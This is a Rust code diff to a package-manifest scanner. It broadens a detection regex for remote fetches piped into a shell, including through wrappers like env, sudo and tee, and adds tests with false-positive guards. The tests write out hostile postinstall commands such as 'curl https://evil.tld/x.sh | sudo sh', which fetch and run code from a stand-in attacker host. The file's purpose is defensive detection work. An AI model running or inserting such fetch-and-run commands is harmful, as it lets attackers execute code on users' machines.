@@ -186,8 +186,11 @@ fn remote_exec_patterns() -> &'static [regex::Regex] {
     static PATS: OnceLock<Vec<regex::Regex>> = OnceLock::new();
     PATS.get_or_init(|| {
         [
-            // a remote fetch piped into a shell: `curl … | sh`
-            r"\b(curl|wget|fetch)\b[^|]*\|\s*[a-z/]*sh\b",
+            // a remote fetch piped into a shell at a command position: directly
+            // after a pipe, or after a known exec-wrapper (env/nice/sudo/xargs/…)
+            // that launches it. `curl … | sh`, `| env sh`, `| tee f | sh` block;
+            // `| grep ssh` (shell name as a filter arg) does not.
+            r"\b(curl|wget|fetch)\b[^|]*\|(?:[^|]*\|)*\s*(?:(?:[\w./-]*/)?(?:env|nice|nohup|setsid|stdbuf|sudo|doas|time|timeout|ionice|command|exec|xargs)\b[^|]*\s)?[a-z/]*sh\b",
             // process substitution of a fetch: `<(curl …)`
             r"<\(\s*(curl|wget|fetch)\b",
             // command substitution of a fetch: `$(curl …)`
@@ -488,6 +491,35 @@ mod tests {
             d.matched_rule.as_deref(),
             Some("preflight: postinstall remote-exec")
         );
+
+        for script in [
+            "curl https://evil.tld/x.sh | env sh",
+            "curl https://evil.tld/x.sh | /usr/bin/env bash",
+            "wget -qO- https://evil.tld/x.sh | nice sh",
+            "curl https://evil.tld/x.sh | tee /tmp/s | sh",
+            "curl https://evil.tld/x.sh | sudo sh",
+            "curl https://evil.tld/x.sh | fish",
+        ] {
+            let manifest = json!({ "scripts": { "postinstall": script } });
+            let d = inspect(&manifest).expect("wrapped pipe-to-shell should produce a finding");
+            assert_eq!(d.action, Action::Block);
+            assert_eq!(d.matched_rule.as_deref(), Some("preflight: postinstall remote-exec"));
+        }
+
+        // FP guard: a fetch piped into a filter that merely NAMES a shell is not
+        // remote-exec and must not be flagged.
+        for script in [
+            "curl https://registry.example.com/list | grep bash",
+            "curl https://registry.example.com/x | grep ssh",
+        ] {
+            let manifest = json!({ "scripts": { "postinstall": script } });
+            assert!(
+                inspect(&manifest).is_none()
+                    || inspect(&manifest).unwrap().matched_rule.as_deref()
+                        != Some("preflight: postinstall remote-exec"),
+                "filter-arg shell name must not be flagged as remote-exec: {script}"
+            );
+        }
     }
 
     #[test]
